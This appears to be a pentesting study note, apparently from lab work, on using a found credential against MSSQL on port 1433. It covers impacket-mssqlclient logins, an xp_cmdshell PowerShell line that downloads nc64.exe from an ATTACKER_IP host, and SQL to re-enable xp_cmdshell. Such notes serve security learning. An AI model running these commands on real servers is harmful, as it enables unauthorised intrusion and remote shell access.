# 1433 — MSSQL

Microsoft SQL Server: a database that, with the right account, runs operating-system commands. Reach for this note when 1433 is open and you already hold a credential — from config looting, a web app, or a service account — because MSSQL is most often the *cash-in* for a credential found elsewhere, not a port you crack blind.

## Connecting

1433. This is where you spend that credential: a login here can lead directly to command execution, so it is worth trying before slower routes.

```bash
impacket-mssqlclient user:password@10.10.10.X -windows-auth
```

- `impacket-mssqlclient` → Kali's packaged Impacket client; no separate install.
- `-windows-auth` → authenticate as a Windows/domain account instead of a SQL login. This is the flag people omit: a `sql_svc` domain account fails as a SQL login and succeeds only with `-windows-auth`, and the failure looks identical to a wrong password.

If you are running Impacket from source instead of the packaged binary:

```bash
python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
```

- `ARCHETYPE/sql_svc` → the `DOMAIN/username` form; the domain is the [[Security-Terms#^netbios|NetBIOS]] name, not an [[Security-Terms#^fqdn|FQDN]].

## Command execution via xp_cmdshell

```text
xp_cmdshell "powershell -c cd $env:TEMP; wget http://ATTACKER_IP/nc64.exe -outfile nc64.exe"
```

- `xp_cmdshell` → runs the string as an OS command on the SQL host.
- `cd $env:TEMP;` → move to a folder the service account can write to first. The command inherits whatever working directory the SQL Server service was started in — a folder you did not choose and the service account often cannot write to — so the download fails on the write, not the fetch. `$env:TEMP` is that account's own temp folder, which it can always write; cmd passes the `$` through untouched and PowerShell expands it. Read the error before blaming the network.
- `-outfile nc64.exe` → PowerShell's `wget` alias (`Invoke-WebRequest`) needs an explicit output path or it prints the response to the console instead of saving it.

To re-enable `xp_cmdshell` when the account is privileged enough:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

- `RECONFIGURE` → the setting does not take effect without it; run each line's `RECONFIGURE` or the change sits pending and `xp_cmdshell` stays blocked.
